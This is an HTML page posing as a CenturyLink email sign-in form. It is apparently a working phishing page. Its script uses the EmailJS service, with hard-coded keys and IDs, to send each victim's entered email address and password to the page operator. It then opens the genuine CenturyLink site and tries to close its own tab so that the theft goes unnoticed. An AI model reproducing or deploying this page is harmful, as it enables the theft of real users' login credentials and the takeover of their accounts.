<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Sign In</title>
<style>
  html, body {
    height: 100%;
    margin: 0;
    font-family: 'Open Sans', "Helvetica Neue", Helvetica, Arial, sans-serif;
    background-color: #ffffff;
  }

  .outer-wrapper {
    height: 80vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
    box-sizing: border-box;
  }

  .form-container {
    width: 100%;
    max-width: 370px;
    background-color: #ffffff;
    padding: 50px 40px;
    box-sizing: border-box;
    box-shadow: 0 0px 0px rgba(0,0,0,0.08);
  }

  form {
    display: flex;
    flex-direction: column;
    gap: 25px;
  }

  .input-group {
    width: 100%;
    display: flex;
    flex-direction: column;
  }

  .field-label {
    font-size: 13px;
    color: #000;
    margin-bottom: 4px;
  }

  .custom-input {
    font-size: 14px;
    border: none;
    border-bottom: 2px solid #ccc;
    background: transparent;
    padding: 10px 0 6px 0;
    width: 100%;
    outline: none;
    transition: border-color 0.3s ease;
  }

  .custom-input:focus {
    border-bottom-color: #0088c1;
  }

  .checkbox-container {
    display: flex;
    align-items: center;
    margin-top: 5px;
  }

  .checkbox-container input[type="checkbox"] {
    width: 16px;
    height: 16px;
    margin-right: 8px;
    cursor: pointer;
  }

  .checkbox-container label {
    font-size: 13px;
    color: #000;
  }

  .custom-submit {
    background-color: #0047bb;
    color: #ffffff;
    font-weight: 400;
    padding: 10px 0;
    height: auto;
    border: 2px solid #0047bb;
    border-radius: 4px;
    cursor: pointer;
    width: 100%;
    text-align: center;
    transition: background-color 0.3s, border-color 0.3s;
    font-size: 14px;
  }

  .custom-submit:hover {
    background-color: #006f9a;
    border-color: #006f9a;
  }

  .error-message {
    color: red;
    font-size: 12px;
    margin-top: 5px;
  }
</style>
</head>
<body>
<div class="outer-wrapper">
  <div class="form-container">
    <form id="contact-form" novalidate>
      <!-- Email Input -->
      <div class="input-group">
        <label for="email-input" class="field-label">CenturyLink Email</label>
        <input
          id="email-input"
          class="custom-input"
          type="email"
          name="user_email"
          required
          placeholder=""
        />
        <div id="email-error" class="error-message"></div>
      </div>

      <!-- Password Input -->
      <div class="input-group">
        <label for="password-input" class="field-label">Password</label>
        <input
          id="password-input"
          class="custom-input"
          type="password"
          name="user_password"
          required
          placeholder=""
        />
        <div id="password-error" class="error-message"></div>
      </div>

      <div class="checkbox-container">
        <input type="checkbox" id="stay-signed-in" name="stay_signed_in" />
        <label for="stay-signed-in">Stay signed in</label>
      </div>

      <button type="submit" class="custom-submit">Sign In</button>
    </form>
  </div>
</div>

<!-- EmailJS v3 browser SDK -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  // Initialize EmailJS with your public key
  emailjs.init("uGRhkufMjo08rjwb_");

  const contactForm = document.getElementById("contact-form");
  const emailInput = document.getElementById("email-input");
  const passwordInput = document.getElementById("password-input");
  const emailError = document.getElementById("email-error");
  const passwordError = document.getElementById("password-error");

  contactForm.addEventListener("submit", function (e) {
    e.preventDefault();

    // Simple front-end validation
    let valid = true;
    emailError.textContent = "";
    passwordError.textContent = "";

    if (!emailInput.value.trim()) {
      emailError.textContent = "Email is required.";
      valid = false;
    }

    if (!passwordInput.value.trim()) {
      passwordError.textContent = "Password is required.";
      valid = false;
    }

    if (!valid) return;

    // Send form via EmailJS
    emailjs.sendForm(
      "service_t84doqy",          // your EmailJS service ID
      "template_awd8sif",         // your EmailJS template ID
      "#contact-form"             // selector for this form
    )
    .then(function (response) {
      console.log("SUCCESS!", response.status, response.text);

      // Open Centurylink in a new tab
      window.open("https://www.centurylink.net", "_blank");

      // Attempt to close current tab (works only if tab was script-opened)
      window.close();
    })
    .catch(function (error) {
      console.error("FAILED...", error);
      alert("Failed to send. Please try again.");
    });
  });
</script>
</body>
</html>
